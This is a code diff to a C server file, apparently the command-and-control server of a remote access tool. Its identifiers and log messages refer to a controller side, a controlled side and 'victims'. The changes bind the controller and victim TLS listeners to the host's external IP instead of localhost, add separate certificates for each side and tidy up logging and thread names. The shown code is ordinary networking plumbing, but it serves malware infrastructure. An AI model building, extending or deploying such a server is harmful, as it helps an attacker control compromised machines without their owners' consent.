@@ -1,9 +1,6 @@
-//
-// Created by cmtheit on 23-5-26.
-//
-
 #include "server.h"
 #include "../util/printlog.h"
+#include "../util/getip.h"
 #include "session.h"
 #include "victim.h"
 #include <pthread.h>
@@ -15,7 +12,7 @@ Server server;
 
 // 为主控端提供服务
 void server_m_on_accept(hio_t * io) {
-    event2_print_log(EVENT_LOG_MSG, "-> 主控端请求");
+    event2_print_log(EVENT_LOG_MSG, "<- 主控端请求");
     SessionEstablishResult ser = session_establish(io);
     if (result_is_err(ser)) {
         switch (result_unwrap(ser)) {
@@ -27,15 +24,16 @@ void server_m_on_accept(hio_t * io) {
                 event2_print_log(EVENT_LOG_WARN, "会话建立" FAILED ".");
                 break;
         }
+    } else {
+        event2_print_log(EVENT_LOG_MSG, "-- 主控端会话建立 --");
     }
 }
 
 // 为受控端提供服务
 void server_e_on_accept(hio_t * io) {
-    event2_print_log(EVENT_LOG_MSG, "受害者程序运行");
+    event2_print_log(EVENT_LOG_MSG, "<- 受控端请求");
     VictimsAddResult add_result = victims_add(io);
     if (result_is_err(add_result)) {
-        hio_close(io);
         switch (result_unwrap(add_result)) {
             case VictimsAddErrOther:
             default:
@@ -49,49 +47,57 @@ void server_e_on_accept(hio_t * io) {
 
 ServerInitResult server_init() {
     ServerInitResult res = result_new_ok(0);
-    server.m.port = config.mport;
-    server.m.hloop = hloop_new(0);
-
+    char ip_adddr[INET_ADDRSTRLEN] = {0};
+    getip(ip_adddr);
+    if (!ip_adddr[0]) {
+        result_turn_err(res, ServerInitGetIP);
+        return res;
+    }
     hssl_ctx_opt_t ssl_param;
     memset(&ssl_param, 0, sizeof(ssl_param));
-    ssl_param.crt_file = "cert/server.crt";
-    ssl_param.key_file = "cert/server.key";
+    ssl_param.crt_file = "cert/m/server.crt";
+    ssl_param.key_file = "cert/m/server.key";
     ssl_param.endpoint = HSSL_SERVER;
-
-    hio_t * mio = hloop_create_ssl_server(server.m.hloop, "127.0.0.1", server.m.port, server_m_on_accept);
+    server.m.port = config.mport;
+    server.m.hloop = hloop_new(0);
+    hio_t * mio = hloop_create_ssl_server(server.m.hloop, ip_adddr, server.m.port, server_m_on_accept);
     if (!mio) {
         result_turn_err(res, ServerInitErrSSLServerCreate);
         return res;
     } else {
         server.m.io = mio;
     }
-    if (hio_new_ssl_ctx(mio, &ssl_param) != 0) {
+    if (hio_new_ssl_ctx(mio, &ssl_param)) {
         result_turn_err(res, ServerInitErrSSLCtx);
         return res;
     }
+
+    memset(&ssl_param, 0, sizeof(ssl_param));
+    ssl_param.crt_file = "cert/e/server.crt";
+    ssl_param.key_file = "cert/e/server.key";
+    ssl_param.endpoint = HSSL_SERVER;
     server.e.port = config.eport;
     server.e.hloop = hloop_new(0);
-    hio_t * eio = hloop_create_ssl_server(server.e.hloop, "127.0.0.1", server.e.port, server_e_on_accept);
+    hio_t * eio = hloop_create_ssl_server(server.e.hloop, ip_adddr, server.e.port, server_e_on_accept);
     if (!eio) {
         result_turn_err(res, ServerInitErrSSLServerCreate);
         return res;
     } else {
         server.e.io = eio;
     }
-    if (hio_new_ssl_ctx(eio, &ssl_param) != 0) {
+    if (hio_new_ssl_ctx(eio, &ssl_param)) {
         result_turn_err(res, ServerInitErrSSLCtx);
         return res;
     }
     return res;
 }
 
-
 static void * server_mptherad_routine(void *) {
     event2_print_log(EVENT_LOG_MSG, "主控端服务器启动...");
     hloop_run(server.m.hloop);
 }
 
-static void * server_cpthread_routine(void *) {
+static void * server_epthread_routine(void *) {
     event2_print_log(EVENT_LOG_MSG, "受控端服务器启动...");
     hloop_run(server.e.hloop);
 }
@@ -99,7 +105,7 @@ static void * server_cpthread_routine(void *) {
 void server_start() {
     // 启动服务器线程
     pthread_create(&server.m.pthread, NULL, server_mptherad_routine, NULL);
-    pthread_create(&server.e.pthread, NULL, server_cpthread_routine, NULL);
+    pthread_create(&server.e.pthread, NULL, server_epthread_routine, NULL);
 }
 
 void server_quit() {
